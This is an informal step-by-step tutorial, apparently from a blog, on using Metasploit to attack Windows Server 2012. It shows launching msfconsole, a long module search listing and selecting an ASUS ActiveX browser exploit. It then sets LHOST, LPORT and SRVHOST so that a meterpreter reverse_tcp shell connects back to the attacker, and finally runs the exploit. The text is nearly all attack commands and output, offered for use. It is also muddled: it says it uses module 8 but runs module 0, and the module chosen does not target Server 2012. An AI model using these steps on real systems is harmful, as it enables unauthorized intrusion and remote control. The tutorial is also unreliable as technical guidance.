Before we begin into hacking windows server 2012, first of all u need to know how to use metasploit to use it to hack anything,
dispite its now common used nowdays hacking something using metasploit, nowdays people do manual means no use of metasploit.

step 1:
```
step one open your terminal or console and type msfconsole(this is going to start it)

┌──(snow㉿alienx)-[~]
└─$ msfconsole -q
msf6 > 

That means that our metasploit is now ready to be used 
```

step 2
```
N/B: something to note  is that the windows server 2012 was vulnelable to many vulnerabilitiesi they range up to 200+
so you can choose of your choice.

┌──(snow㉿alienx)-[~]
└─$ msfconsole -q
msf6 > search windows 2012

Matching Modules
================

   #    Name                                                                  Disclosure Date  Rank       Check  Description
   -    ----                                                                  ---------------  ----       -----  -----------
   0    exploit/windows/browser/asus_net4switch_ipswcom                       2012-02-17       normal     No     ASUS Net4Switch ipswcom.dll ActiveX Stack Buffer Overflow
   1    exploit/windows/fileformat/actfax_import_users_bof                    2012-08-28       normal     No     ActiveFax (ActFax) 4.3 Client Importer Buffer Overflow
   2    exploit/windows/browser/adobe_flash_otf_font                          2012-08-09       normal     No     Adobe Flash Player 11.3 Kern Table Parsing Integer Overflow
   3    exploit/windows/browser/adobe_flash_mp4_cprt                          2012-02-15       normal     No     Adobe Flash Player MP4 'cprt' Overflow
   4    exploit/windows/browser/adobe_flash_rtmp                              2012-05-04       normal     No     Adobe Flash Player Object Type Confusion
   5    exploit/multi/http/struts_code_exec_parameters                        2011-10-01       excellent  Yes    Apache Struts ParametersInterceptor Remote Code Execution
   6    exploit/multi/http/struts_code_exec_exception_delegator               2012-01-06       excellent  No     Apache Struts Remote Command Execution
   7    exploit/windows/http/apache_tika_jp2_jscript                          2018-04-25       excellent  Yes    Apache Tika Header Command Injection
   8    exploit/windows/browser/apple_quicktime_mime_type                     2012-11-07       normal     No     Apple QuickTime 7.7.2 MIME Type Buffer Overflow
   9    exploit/windows/browser/apple_quicktime_texml_font_table              2012-11-07       normal     No     Apple QuickTime 7.7.2 TeXML Style Element font-table Field Stack Buffer Overflow
   10   exploit/windows/fileformat/apple_quicktime_texml                      2012-05-15       normal     No     Apple QuickTime TeXML Style Element Stack Buffer Overflow
   11   auxiliary/scanner/http/atlassian_crowd_fileaccess                                      normal     No     Atlassian Crowd XML Entity Expansion Remote File Access
   12   exploit/windows/http/avaya_ccr_imageupload_exec                       2012-06-28       excellent  No     Avaya IP Office Customer Call Reporter ImageUpload.ashx Remote Command Execution
   13   auxiliary/admin/http/axigen_file_access                               2012-10-31       normal     No     Axigen Arbitrary File Read and Delete
   14   exploit/windows/misc/bigant_server_sch_dupf_bof                       2013-01-09       normal     No     BigAnt Server 2 SCH And DUPF Buffer Overflow
   15   exploit/windows/misc/bigant_server_dupf_upload                        2013-01-09       excellent  No     BigAnt Server DUPF Command Arbitrary File Upload
   16   exploit/windows/browser/cisco_playerpt_setsource                      2012-03-22       normal     No     Cisco Linksys PlayerPT ActiveX Control Buffer Overflow
   17   exploit/windows/browser/cisco_playerpt_setsource_surl                 2012-07-17       normal     No     Cisco Linksys PlayerPT ActiveX Control SetSource sURL Argument Buffer Overflow
   18   exploit/windows/fileformat/coolpdf_image_stream_bof                   2013-01-18       normal     No     Cool PDF Image Stream Buffer Overflow
   19   exploit/windows/fileformat/csound_getnum_bof                          2012-02-23       normal     No     Csound hetro File Handling Stack Buffer Overflow
   20   exploit/windows/http/sonicwall_scrutinizer_sqli                       2012-07-22       excellent  Yes    Dell SonicWALL (Plixer) Scrutinizer 9 SQL Injection
   21   exploit/windows/tftp/distinct_tftp_traversal                          2012-04-08       excellent  No     Distinct TFTP 3.10 Writable Directory Traversal Execution
   22   exploit/windows/fileformat/emc_appextender_keyworks                   2009-09-29       average    No     EMC ApplicationXtender (KeyWorks) ActiveX Control Buffer Overflow
   23   exploit/windows/emc/networker_format_string                           2012-08-29       normal     No     EMC Networker Format String
   24   exploit/windows/http/ezserver_http                                    2012-06-18       excellent  No     EZHomeTech EzServer Stack Buffer Overflow Vulnerability
   25   exploit/windows/http/ektron_xslt_exec                                 2012-10-16       excellent  Yes    Ektron 8.02 XSLT Transform Remote Code Execution
   26   exploit/windows/http/flexdotnetcms_upload_exec                        2020-09-28       excellent  Yes    FlexDotnetCMS Arbitrary ASP File Upload
   27   exploit/windows/ssh/freesshd_authbypass                               2010-08-11       excellent  Yes    Freesshd Authentication Bypass
   28   exploit/windows/misc/gimp_script_fu                                   2012-05-18       normal     No     GIMP script-fu Server Buffer Overflow
   29   exploit/windows/http/hp_autopass_license_traversal                    2014-01-10       great      Yes    HP AutoPass License Server File Upload
   30   exploit/windows/misc/hp_dataprotector_new_folder                      2012-03-12       normal     No     HP Data Protector Create New Folder Buffer Overflow
   31   exploit/windows/http/hp_imc_mibfileupload                             2013-03-07       great      Yes    HP Intelligent Management Center Arbitrary File Upload
   32   exploit/windows/misc/hp_imc_uam                                       2012-08-29       normal     No     HP Intelligent Management Center UAM Buffer Overflow
   33   auxiliary/scanner/http/hp_imc_faultdownloadservlet_traversal                           normal     No     HP Intelligent Management FaultDownloadServlet Directory Traversal
   34   auxiliary/scanner/http/hp_imc_ictdownloadservlet_traversal                             normal     No     HP Intelligent Management IctDownloadServlet Directory Traversal
   35   auxiliary/scanner/http/hp_imc_reportimgservlt_traversal                                normal     No     HP Intelligent Management ReportImgServlt Directory Traversal
   36   exploit/windows/misc/hp_operations_agent_coda_34                      2012-07-09       normal     Yes    HP Operations Agent Opcode coda.exe 0x34 Buffer Overflow
   37   exploit/windows/misc/hp_operations_agent_coda_8c                      2012-07-09       normal     Yes    HP Operations Agent Opcode coda.exe 0x8c Buffer Overflow
   38   exploit/multi/http/hp_sitescope_uploadfileshandler                    2012-08-29       good       No     HP SiteScope Remote Code Execution
   39   exploit/windows/misc/ibm_cognos_tm1admsd_bof                          2012-04-02       normal     No     IBM Cognos tm1admsd.exe Overflow
   40   exploit/windows/browser/notes_handler_cmdinject                       2012-06-18       excellent  No     IBM Lotus Notes Client URL Handler Command Injection
   41   exploit/windows/browser/quickr_qp2_bof                                2012-05-23       normal     No     IBM Lotus QuickR qp2 ActiveX Buffer Overflow
   42   exploit/windows/browser/inotes_dwa85w_bof                             2012-06-01       normal     No     IBM Lotus iNotes dwa85W ActiveX Buffer Overflow
   43   exploit/windows/fileformat/ibm_pcm_ws                                 2012-02-28       great      No     IBM Personal Communications iSeries Access WorkStation 5.9 Profile
   44   exploit/windows/browser/clear_quest_cqole                             2012-05-19       normal     No     IBM Rational ClearQuest CQOle Remote Code Execution
   45   exploit/windows/browser/ibm_spss_c1sizer                              2013-04-26       normal     No     IBM SPSS SamplePower C1Tab ActiveX Heap Overflow
   46   exploit/windows/misc/ibm_director_cim_dllinject                       2009-03-10       excellent  Yes    IBM System Director Agent DLL Injection
   47   exploit/windows/browser/ibm_tivoli_pme_activex_bof                    2012-03-01       normal     No     IBM Tivoli Provisioning Manager Express for Software Distribution Isig.isigCtl.1 ActiveX RunAndUploadFile() Method Overflow
   48   exploit/windows/fileformat/irfanview_jpeg2000_bof                     2012-01-16       normal     No     Irfanview JPEG2000 jp2 Stack Buffer Overflow
   49   exploit/multi/browser/java_jre17_exec                                 2012-08-26       excellent  No     Java 7 Applet Remote Code Execution
   50   exploit/multi/browser/java_jre17_glassfish_averagerangestatisticimpl  2012-10-16       excellent  No     Java Applet AverageRangeStatisticImpl Remote Code Execution
   51   exploit/multi/browser/java_verifier_field_access                      2012-06-06       excellent  No     Java Applet Field Bytecode Verifier Cache Remote Code Execution
   52   exploit/multi/browser/java_jre17_jaxws                                2012-10-16       excellent  No     Java Applet JAX-WS Remote Code Execution
   53   exploit/multi/browser/java_jre17_jmxbean_2                            2013-01-19       excellent  No     Java Applet JMX Remote Code Execution
   54   exploit/multi/browser/java_jre17_method_handle                        2012-10-16       excellent  No     Java Applet Method Handle Remote Code Execution
   55   exploit/multi/browser/java_jre17_provider_skeleton                    2013-06-18       great      No     Java Applet ProviderSkeleton Insecure Invoke Method
   56   exploit/multi/browser/java_atomicreferencearray                       2012-02-14       excellent  No     Java AtomicReferenceArray Type Violation Vulnerability
   57   exploit/windows/browser/keyhelp_launchtripane_exec                    2012-06-26       excellent  No     KeyHelp ActiveX LaunchTriPane Remote Code Execution Vulnerability
   58   exploit/windows/fileformat/kingview_kingmess_kvl                      2012-11-20       normal     No     KingView Log File Parsing Buffer Overflow
   59   exploit/windows/http/landesk_thinkmanagement_upload_asp               2012-02-15       excellent  No     LANDesk Lenovo ThinkManagement Console Remote Command Execution
   60   exploit/windows/fileformat/lattice_pac_bof                            2012-05-16       normal     No     Lattice Semiconductor PAC-Designer 6.21 Symbol Value Buffer Overflow
   61   exploit/windows/browser/ms10_002_ie_object                            2010-01-21       normal     No     MS10-002 Microsoft Internet Explorer Object Memory Use-After-Free
   62   exploit/windows/browser/ms10_018_ie_behaviors                         2010-03-09       good       No     MS10-018 Microsoft Internet Explorer DHTML Behaviors Use After Free
   63   exploit/windows/browser/ms12_004_midi                                 2012-01-10       normal     No     MS12-004 midiOutPlayNextPolyEvent Heap Overflow
   64   exploit/windows/fileformat/ms12_005                                   2012-01-10       excellent  No     MS12-005 Microsoft Office ClickOnce Unsafe Object Package Handling Vulnerability
   65   auxiliary/dos/windows/rdp/ms12_020_maxchannelids                      2012-03-16       normal     No     MS12-020 Microsoft Remote Desktop Use-After-Free DoS
   66   exploit/windows/fileformat/ms12_027_mscomctl_bof                      2012-04-10       average    No     MS12-027 MSCOMCTL ActiveX Buffer Overflow
   67   exploit/windows/browser/ms12_037_ie_colspan                           2012-06-12       normal     No     MS12-037 Microsoft Internet Explorer Fixed Table Col Span Heap Overflow
   68   exploit/windows/browser/ms12_037_same_id                              2012-06-12       normal     No     MS12-037 Microsoft Internet Explorer Same ID Property Deleted Object Handling Memory Corruption
   69   exploit/windows/browser/msxml_get_definition_code_exec                2012-06-12       good       No     MS12-043 Microsoft XML Core Services MSXML Uninitialized Memory Corruption
   70   exploit/windows/browser/ie_execcommand_uaf                            2012-09-14       good       No     MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability
   71   exploit/windows/local/ms13_005_hwnd_broadcast                         2012-11-27       excellent  No     MS13-005 HWND_BROADCAST Low to Medium Integrity Privilege Escalation
   72   exploit/windows/browser/ie_cbutton_uaf                                2012-12-27       normal     No     MS13-008 Microsoft Internet Explorer CButton Object Use-After-Free Vulnerability
   73   exploit/windows/fileformat/ms14_060_sandworm                          2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
   74   exploit/windows/fileformat/ms14_064_packager_run_as_admin             2014-10-21       excellent  No     MS14-064 Microsoft Windows OLE Package Manager Code Execution
   75   exploit/windows/fileformat/ms14_064_packager_python                   2014-11-12       excellent  No     MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python
   76   auxiliary/scanner/http/ms15_034_http_sys_memory_dump                                   normal     Yes    MS15-034 HTTP Protocol Stack Request Handling HTTP.SYS Memory Information Disclosure
   77   exploit/windows/smb/ms17_010_eternalblue                              2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   78   auxiliary/gather/manageengine_adaudit_plus_xnode_enum                                  normal     Yes    ManageEngine ADAudit Plus Xnode Enumeration
   79   auxiliary/gather/manageengine_datasecurity_plus_xnode_enum                             normal     Yes    ManageEngine DataSecurity Plus Xnode Enumeration
   80   exploit/multi/http/maracms_upload_exec                                2020-08-31       excellent  Yes    MaraCMS Arbitrary PHP File Upload
   81   exploit/windows/browser/maxthon_history_xcs                           2012-11-26       excellent  No     Maxthon3 about:history XCS Trusted Zone Code Execution
   82   exploit/windows/browser/mcafee_mvt_exec                               2012-04-30       excellent  No     McAfee Virtual Technician MVTControl 6.3.0.1911 GetObject Vulnerability
   83   exploit/windows/mssql/mssql_clr_payload                               1999-01-01       excellent  Yes    Microsoft SQL Server Clr Stored Procedure Payload Execution
   84   exploit/windows/mssql/mssql_linkcrawler                               2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
   85   auxiliary/scanner/smb/psexec_loggedin_users                                            normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
   86   auxiliary/gather/windows_deployment_services_shares                                    normal     No     Microsoft Windows Deployment Services Unattend Gatherer
   87   auxiliary/scanner/dcerpc/windows_deployment_services                                   normal     No     Microsoft Windows Deployment Services Unattend Retrieval
   88   exploit/windows/novell/file_reporter_fsfui_upload                     2012-11-16       great      No     NFR Agent FSFUI Record File Upload RCE
   89   exploit/windows/browser/ntr_activex_check_bof                         2012-01-11       normal     No     NTR ActiveX Control Check() Method Buffer Overflow
   90   exploit/windows/browser/ntr_activex_stopmodule                        2012-01-11       normal     No     NTR ActiveX Control StopModule() Remote Code Execution
   91   exploit/windows/http/netdecision_http_bof                             2012-02-24       normal     Yes    NetDecision 4.5.1 HTTP Server Buffer Overflow
   92   exploit/windows/novell/netiq_pum_eval                                 2012-11-15       excellent  Yes    NetIQ Privileged User Manager 2.3.1 ldapagnt_eval() Remote Perl Code Execution
   93   exploit/windows/browser/novell_groupwise_gwcls1_actvx                 2013-01-30       normal     No     Novell GroupWise Client gwcls1.dll ActiveX Remote Code Execution
   94   auxiliary/scanner/http/groupwise_agents_http_traversal                                 normal     No     Novell Groupwise Agents HTTP Directory Traversal
   95   exploit/windows/novell/zenworks_preboot_op21_bof                      2010-03-30       normal     No     Novell ZENworks Configuration Management Preboot Service 0x21 Buffer Overflow
   96   auxiliary/scanner/misc/zenworks_preboot_fileaccess                                     normal     No     Novell ZENworks Configuration Management Preboot Service Remote File Access
   97   exploit/windows/local/nvidia_nvsvc                                    2012-12-25       average    Yes    Nvidia (nvsvc) Display Driver Service Local Privilege Escalation
   98   exploit/windows/browser/oracle_autovue_setmarkupmode                  2012-04-18       normal     No     Oracle AutoVue ActiveX Control SetMarkupMode Buffer Overflow
   99   exploit/multi/http/oracle_reports_rce                                 2014-01-15       great      Yes    Oracle Forms and Reports Remote Code Execution
   100  exploit/windows/mysql/mysql_start_up                                  2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows FILE Privilege Abuse
   101  exploit/windows/mysql/mysql_mof                                       2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows MOF Execution
   102  exploit/windows/http/php_apache_request_headers_bof                   2012-05-08       normal     No     PHP apache_request_headers Function Buffer Overflow
   103  exploit/windows/mysql/scrutinizer_upload_exec                         2012-07-27       excellent  Yes    Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Credential
   104  exploit/windows/browser/intrust_annotatex_add                         2012-03-28       average    No     Quest InTrust Annotation Objects Uninitialized Pointer
   105  exploit/windows/fileformat/winrar_ace                                 2019-02-05       excellent  No     RARLAB WinRAR ACE Format Input Validation Remote Code Execution
   106  exploit/windows/fileformat/real_player_url_property_bof               2012-12-14       normal     No     RealPlayer RealMedia File Handling Buffer Overflow
   107  exploit/windows/ftp/ricoh_dl_bof                                      2012-03-01       normal     Yes    Ricoh DC DL-10 SR10 FTP USER Command Buffer Overflow
   108  exploit/windows/http/sap_configservlet_exec_noauth                    2012-11-01       great      Yes    SAP ConfigServlet Remote Code Execution
   109  exploit/windows/misc/sap_netweaver_dispatcher                         2012-05-08       normal     No     SAP NetWeaver Dispatcher DiagTraceR3Info Buffer Overflow
   110  exploit/multi/sap/sap_soap_rfc_sxpg_command_exec                      2012-05-08       great      Yes    SAP SOAP RFC SXPG_COMMAND_EXECUTE Remote Command Execution
   111  exploit/windows/scada/codesys_gateway_server_traversal                2013-02-02       excellent  No     SCADA 3S CoDeSys Gateway Server Directory Traversal
   112  auxiliary/scanner/smb/smb_enum_gpp                                                     normal     No     SMB Group Policy Preference Saved Passwords Enumeration
   113  exploit/windows/browser/samsung_neti_wiewer_backuptoavi_bof           2012-04-21       normal     No     Samsung NET-i Viewer Multiple ActiveX BackupToAvi() Remote Overflow
   114  exploit/windows/scada/winlog_runtime_2                                2012-06-04       normal     No     Sielco Sistemi Winlog Buffer Overflow 2.07.14 - 2.07.16
   115  exploit/windows/http/sws_connection_bof                               2012-07-20       normal     Yes    Simple Web Server Connection Header Buffer Overflow
   116  exploit/windows/http/solarwinds_storage_manager_sql                   2011-12-07       excellent  Yes    Solarwinds Storage Manager 5.1.0 SQL Injection
   117  exploit/multi/http/splunk_upload_app_exec                             2012-09-27       good       Yes    Splunk Custom App Remote Code Execution
   118  post/windows/manage/sticky_keys                                                        normal     No     Sticky Keys Persistance Module
   119  exploit/windows/browser/java_ws_double_quote                          2012-10-16       excellent  No     Sun Java Web Start Double Quote Injection
   120  exploit/windows/browser/java_ws_vmargs                                2012-02-14       excellent  No     Sun Java Web Start Plugin Command Line Argument Injection
   121  exploit/windows/ssh/sysax_ssh_username                                2012-02-27       normal     Yes    Sysax 5.53 SSH Username Buffer Overflow
   122  exploit/windows/http/sysax_create_folder                              2012-07-29       normal     No     Sysax Multi Server 5.64 Create Folder Buffer Overflow
   123  exploit/windows/browser/ultramjcam_openfiledig_bof                    2012-03-28       normal     No     TRENDnet SecurView Internet Camera UltraMJCam OpenFileDlg Buffer Overflow
   124  exploit/windows/browser/ubisoft_uplay_cmd_exec                        2012-07-29       normal     No     Ubisoft uplay 2.0.3 ActiveX Control Arbitrary Code Execution
   125  exploit/windows/http/umbraco_upload_aspx                              2012-06-28       excellent  No     Umbraco CMS Remote Command Execution
   126  exploit/windows/browser/vlc_mms_bof                                   2012-03-15       normal     No     VLC MMS Stream Handling Buffer Overflow
   127  exploit/windows/browser/ovftool_format_string                         2012-11-08       normal     No     VMWare OVF Tools Format String Vulnerability
   128  exploit/windows/fileformat/ovf_format_string                          2012-11-08       normal     No     VMWare OVF Tools Format String Vulnerability
   129  auxiliary/admin/backupexec/dump                                                        normal     No     Veritas Backup Exec Windows Remote File Access
   130  post/windows/gather/exchange                                                           normal     No     Windows Gather Exchange Server Mailboxes
   131  post/windows/gather/credentials/gpp                                                    normal     No     Windows Gather Group Policy Preference Saved Passwords
   132  post/windows/gather/credentials/spark_im                                               normal     No     Windows Gather Spark IM Password Extraction
   133  post/windows/manage/mssql_local_auth_bypass                                            normal     No     Windows Manage Local Microsoft SQL Server Authorization Bypass
   134  exploit/windows/local/cve_2018_8453_win32k_priv_esc                   2018-10-09       manual     No     Windows NtUserSetWindowFNID Win32k User Callback
   135  post/windows/manage/wdigest_caching                                                    normal     No     Windows Post Manage WDigest Credential Caching
   136  auxiliary/fileformat/multidrop                                                         normal     No     Windows SMB Multi Dropper
   137  exploit/windows/local/srclient_dll_hijacking                          2021-02-19       excellent  Yes    Windows Server 2012 SrClient DLL hijacking


Interact with a module by name or index. For example info 137, use 137 or use exploit/windows/local/srclient_dll_hijacking

msf6 >
```

step 3
```
since we got some bunch of exploit out there, am goind to use the one with the id=8 but u can use any of your kind incase if it works for you

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/browser/asus_net4switch_ipswcom) >

NB: something good with metasploit is that we can use the metasploit module with typing (use 8) simple as that

```

step 4
```
After that now we need to know which options were required to fill so as our exploit to work well, we can do this by using a command (show options)

msf6 exploit(windows/browser/asus_net4switch_ipswcom) > show options

Module options (exploit/windows/browser/asus_net4switch_ipswcom):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   OBFUSCATE  false            no        Enable JavaScript obfuscation
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the lo
                                         cal machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  seh              yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/browser/asus_net4switch_ipswcom) >

```

step 5
```
There are some important options we need to input here
1.LPORT
2. LHOST
3.SRVHOST and
4. SRVPORT (for exam leave it as default)

msf6 exploit(windows/browser/asus_net4switch_ipswcom) > set LHOST 172.12.12.11
LHOST => 172.12.12.11
msf6 exploit(windows/browser/asus_net4switch_ipswcom) > set LPORT 1234
LPORT => 1234
msf6 exploit(windows/browser/asus_net4switch_ipswcom) > set SRVHOST 192.168.12.11
SRVHOST => 192.168.12.11
msf6 exploit(windows/browser/asus_net4switch_ipswcom) > 

```

step 6
```
N/B: after we have done with  every option we need to input here, we now need to run the exploit

msf6 exploit(windows/browser/asus_net4switch_ipswcom) > exploit
```
